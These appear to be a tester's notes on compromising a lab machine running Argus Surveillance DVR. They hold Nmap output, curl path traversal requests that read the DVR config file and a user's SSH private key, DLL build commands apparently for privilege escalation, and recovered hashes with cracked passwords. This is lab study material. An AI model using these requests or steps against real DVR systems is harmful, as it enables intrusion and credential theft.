#Pwned! 
```IP
192.168.170.179
```
## Nmap
```
PORT     STATE SERVICE       REASON          VERSION                                                                  
22/tcp   open  ssh           syn-ack ttl 125 Bitvise WinSSHD 8.48 (FlowSsh 8.48; protocol 2.0; non-commercial use)
| ssh-hostkey:                                                                                                        
|   3072 21:25:f0:53:b4:99:0f:34:de:2d:ca:bc:5d:fe:20:ce (RSA)                                
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCsljcHdJN7STx92SFZR/dtzDsO0v1blAoUfqWva1WJD9WXeKe0S9Oeg4L1eXC6ik5O6+lE7SRqz7Qiudrhk9CXxB0tmmX2SpZKMg1l01wmO5QEhpeuhDOb062dCDc1byOkpbBJq93afwVOEiaCOMVVjnwvJ5MFmZQzBcb02rmHKH7+o2BjMukTA8coWhCc2cqyEg
PA031zSYCkdzxLlgHJMUlbDDtD0D143rLPZ6CtP5Nbxpbt/2Hj3thq7GQzToNdgCYCEIMg6Gs4xYHLO4lKcOb92wFdEtx+hA7xFxGOldfmEU4f3jyDSFazolJU4TxzewQ/kIi1W4Cj+tarEVTC6sBUAhHZSLAj5nkz7rljJIXiM8hYp6VMcpsqa1dtlwspeiFXL2RizuQgUzabzsQGmZ0Yu501ieYy1i7mIEWzO2UUx3
tnCn9YKAh30jYQQvXYB+oUGuQqDIQh1f0Ds/Jd1IkFMJ8EZQ8Iaoa1UVpxupdZ8jtBm3BKT5+sVtJ4jwE=
|   384 e7:96:f3:6a:d8:92:07:5a:bf:37:06:86:0a:31:73:19 (ECDSA)           
|_ecdsa-sha2-nistp384 AAAAE2VjZHNhLXNoYTItbmlzdHAzODQAAAAIbmlzdHAzODQAAABhBEqSs/ONYXuZGcGBUkLstnAWRP6wNsuJz6yUtmYymbBUobb797y3tkgWkCUhaDsB3z8XzhgoyCXS6MuXqF3FmiapitvPj1ig5TnVnHRvzuB2beKi/cH2XBduyaaKO6AORg==                              
135/tcp  open  msrpc         syn-ack ttl 125 Microsoft Windows RPC        
139/tcp  open  netbios-ssn   syn-ack ttl 125 Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds? syn-ack ttl 125                                                                          
8080/tcp open  http-proxy    syn-ack ttl 125                                                                          
|_http-title: Argus Surveillance DVR  
```

## Nmap UDP


# Enumeration

## HTTP
https://www.exploit-db.com/exploits/45296
works
```
curl "http://192.168.170.179:8080/WEBACCOUNT.CGI?OkBtn=++Ok++&RESULTPAGE=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FProgramData%2FPY_Software%2FArgus%20Surveillance%20DVR%2FDVRParams.ini&USEREDIRECT=1&WEBACCOUNTID=&WEBACCOUNTPASSWORD="
```
```
curl "http://192.168.170.179:8080/WEBACCOUNT.CGI?OkBtn=++Ok++&RESULTPAGE=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FUsers%2FViewer%2F.ssh%2Fid_rsa&USEREDIRECT=1&WEBACCOUNTID=&WEBACCOUNTPASSWORD="
```

```ssh_config
SetEnv TERM=xterm
```


# PrivEsc

## Manual

### WHOAMI /ALL

```
USER INFORMATION                                                                                                                                                                                                                            
----------------                                                                                                                                                                                                                            
                                                                                                                                                                                                                                            
User Name   SID                                                                                                                                                                                                                             
=========== ==============================================                                                                                                                                                                                  
dvr4\viewer S-1-5-21-2619112490-2635448554-1147358759-1002                                                                                                                                                                                  
                                                                                                                                                                                                                                            
                                                                                                                                                                                                                                            
GROUP INFORMATION                                                                                                                                                                                                                           
-----------------                                                                                                                                                                                                                           
                                                                                                                                                                                                                                            
Group Name                             Type             SID          Attributes                                                                                                                                                             
====================================== ================ ============ ==================================================                                                                                                                     
Everyone                               Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group                                                                                                                     
BUILTIN\Users                          Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group                                                                                                                     
NT AUTHORITY\NETWORK                   Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group                                                                                                                     
NT AUTHORITY\Authenticated Users       Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group                                                                                                                     
NT AUTHORITY\This Organization         Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group                                                                                                                     
NT AUTHORITY\Local account             Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group                                                                                                                     
Mandatory Label\Medium Mandatory Level Label            S-1-16-8192                                                                                                                                                                         
                                                                                                                                                                                                                                            
                                                                                                                                                                                                                                            
PRIVILEGES INFORMATION                                                                                                                                                                                                                      
----------------------                                                                                                                                                                                                                      
                                                                                                                                                                                                                                            
Privilege Name                Description                          State                                                                                                                                                                    
============================= ==================================== =======                                                                                                                                                                  
SeShutdownPrivilege           Shut down the system                 Enabled                                                                                                                                                                  
SeChangeNotifyPrivilege       Bypass traverse checking             Enabled                                                                                                                                                                  
SeUndockPrivilege             Remove computer from docking station Enabled                                                                                                                                                                  
SeIncreaseWorkingSetPrivilege Increase a process working set       Enabled                                                                                                                                                                  
SeTimeZonePrivilege           Change the time zone                 Enabled
```
### Software
```
Argus DVR Viewer                                                                        Argus Surveillance DVR                                                                  Bitvise SSH Server 8.48 (remove only)  
```

gcc -c -m32 gsm_codec.c
gcc -shared -m32 -o gsm_codec.dll gsm_codec.o

C:\Program Files\Argus Surveillance DVR\DVRWatchdog.exe] - Autoload - No quotes and Space detected

Mirar en `C:\ProgramData\PY_Software\Argus Surveillance DVR\DVRParams.ini`
5E534D7B6069F641E03BD9BD956BC875EB603CD9D8E1BD8FAAFE
ImWatchingY0u

ECB453D16069F641E03BD9BD956BFE36BD8F3CD9D9A8
`14WatchD0g$`
## Automated

### Peass
### Mimikatz

